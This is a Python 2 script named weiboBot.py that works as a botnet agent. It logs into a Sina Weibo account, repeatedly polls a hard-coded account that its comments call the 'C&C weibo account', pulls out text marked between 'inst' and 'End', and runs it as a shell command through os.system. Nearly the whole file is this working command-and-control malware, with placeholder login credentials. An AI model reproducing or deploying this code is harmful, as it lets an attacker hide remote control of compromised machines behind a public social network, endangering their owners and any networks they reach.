#!/usr/bin/python
# coding=utf-8
# filename: weiboBot.py

import re
import json
import urllib
import base64
import binascii

 
import rsa
import requests
import chardet


import logging
import sys
import os
from threading import Timer
from optparse import OptionParser

reload(sys)  
sys.setdefaultencoding('utf8')

logging.basicConfig(level=logging.DEBUG)

# const variables declaration

lastDate = "" # To label the instruction is new or old ones
WBCLIENT = 'ssologin.js(v1.4.5)' # You can change this accoriding to the latest situation
# To set the user-agent
user_agent = (
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) '
	'Chrome/20.0.1132.57 Safari/536.11')

session = requests.session()
session.headers['User-Agent'] = user_agent
 
def flogin_url(uid,udomain):
	'''
		return the final login url for weibo users
		@parameter1 uid @parameter2 udomain we can retrieve from the resulf for wblogin function
	'''
	url = "http://weibo.com/u/{0}/home?/{1}".format(uid,udomain)
	return url

def encrypt_passwd(passwd, pubkey, servertime, nonce):
	'''
	The data posted to weibo server is encrypted by rsa
	@parameter1 passwd(str): The user's password
	@parameter2 pubkey(str): The PublicKey which is returned from weibo server
	@parameter3 servertime(str): Which is returned from weibo server
	@parameter4 nonce(str): Which is returned from weibo server
	'''
	key = rsa.PublicKey(int(pubkey, 16), int('10001', 16))
	message = str(servertime) + '\t' + str(nonce) + '\n' + str(passwd)
	passwd = rsa.encrypt(message, key)
	return binascii.b2a_hex(passwd)
 
 
def wblogin(username, password):
	'''
	The log in function for weibo client
	@parameter1 username(str): which is email or user id 
	@parameter2 password(str): which is password
	The return result is the html content for the specificed user
	'''
	resp = session.get(
		'http://login.sina.com.cn/sso/prelogin.php?'
		'entry=sso&callback=sinaSSOController.preloginCallBack&'
		'su=%s&rsakt=mod&client=%s' %
		(base64.b64encode(username), WBCLIENT)
	)
 
	pre_login_str = re.match(r'[^{]+({.+?})', resp.content).group(1)
	pre_login = json.loads(pre_login_str)
 
	pre_login = json.loads(pre_login_str)
	data = {
		'entry': 'weibo',
		'gateway': 1,
		'from': '',
		'savestate': 7,
		'userticket': 1,
		'ssosimplelogin': 1,
		'su': base64.b64encode(urllib.quote(username)),
		'service': 'miniblog',
		'servertime': pre_login['servertime'],
		'nonce': pre_login['nonce'],
		'vsnf': 1,
		'vsnval': '',
		'pwencode': 'rsa2',
		'sp': encrypt_passwd(password, pre_login['pubkey'],
							 pre_login['servertime'], pre_login['nonce']),
		'rsakv' : pre_login['rsakv'],
		'encoding': 'UTF-8',
		'prelt': '115',
		'url': 'http://weibo.com/ajaxlogin.php?framelogin=1&callback=parent.si'
			   'naSSOController.feedBackUrlCallBack',
		'returntype': 'META'
	}
	resp = session.post(
		'http://login.sina.com.cn/sso/login.php?client=%s' % WBCLIENT,
		data=data
	)
 
	login_url = re.search(r'replace\([\"\']([^\'\"]+)[\"\']',
						  resp.content).group(1)
	resp = session.get(login_url)
	
	login_str = re.match(r'[^{]+({.+?}})', resp.content).group(1)
	
	urljson = json.loads(login_str)
	finalurl = flogin_url(urljson['userinfo']['uniqueid'],urljson['userinfo']['userdomain'])
	
	resp = session.get(finalurl)
	
	return resp.content
 
def setTarget():
	'''
	This target is the C&C weibo account and to become fans each other with weibo bot. 
	You can set this by yourself according to the situation
	'''
	targetUrl = u'http://weibo.com/u/3962858141'
	return targetUrl

def excIns(content):
	'''
	Receive and retrieve the commands from the C&C weibo account,and excecute it.
	parameter1 content(str): is the returned value from function wblogin
	The instruction's format is like 'inst demoinstruct End',the real instruction wants to be excecuted is demoinstruct
	'''
	global lastDate
	inspattern = r'\binst.+\bEnd'
	datepattern = r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}'
	ins = re.findall(r'(?<=\binst).+?(?=\bEnd)',content)
	date = re.findall(datepattern,content)

	if date[0] != lastDate:
		eins = ins[0].strip()
		os.system(eins)
		lastDate = date[0]
	else:
		print "This is the last instruction"

def PeriodExcecute(period=10.0):
	'''
		To check whether there is new instruction from C&C server
		The default period is 10 seconds
	'''
	resp = wblogin('xxxxx@163.com', 'xxxxxx')  # input your weibo username or email and passwords
	resp = session.get(setTarget())
	with open('test.log','w') as file:
		file.write(resp.content)
	excIns(resp.content)
	t = Timer(period,PeriodExcecute)
	t.start()

 
if __name__ == '__main__':
	
	useage = "To be as a weibo bot for a specificed weibo account"
	parser = OptionParser(useage=useage)
	parser.add_option('-p','--period',help='the period you want to check the C&C instruction')
	(options,args) = parser.parse_args()

	t = Timer(options.period,PeriodExcecute)
	t.start()

	

